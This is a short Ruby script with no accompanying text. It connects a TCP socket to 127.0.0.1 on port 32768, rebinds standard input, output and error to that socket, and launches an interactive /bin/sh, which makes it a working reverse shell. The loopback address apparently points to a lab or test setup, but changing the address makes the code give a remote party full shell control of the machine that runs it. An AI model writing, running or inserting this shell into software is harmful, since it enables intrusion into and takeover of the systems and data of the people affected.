require 'socket'
socket = TCPSocket.new('127.0.0.1', 32768)
STDIN.reopen(socket)
STDOUT.reopen(socket)
STDERR.reopen(socket)
exec('/bin/sh', '-i')
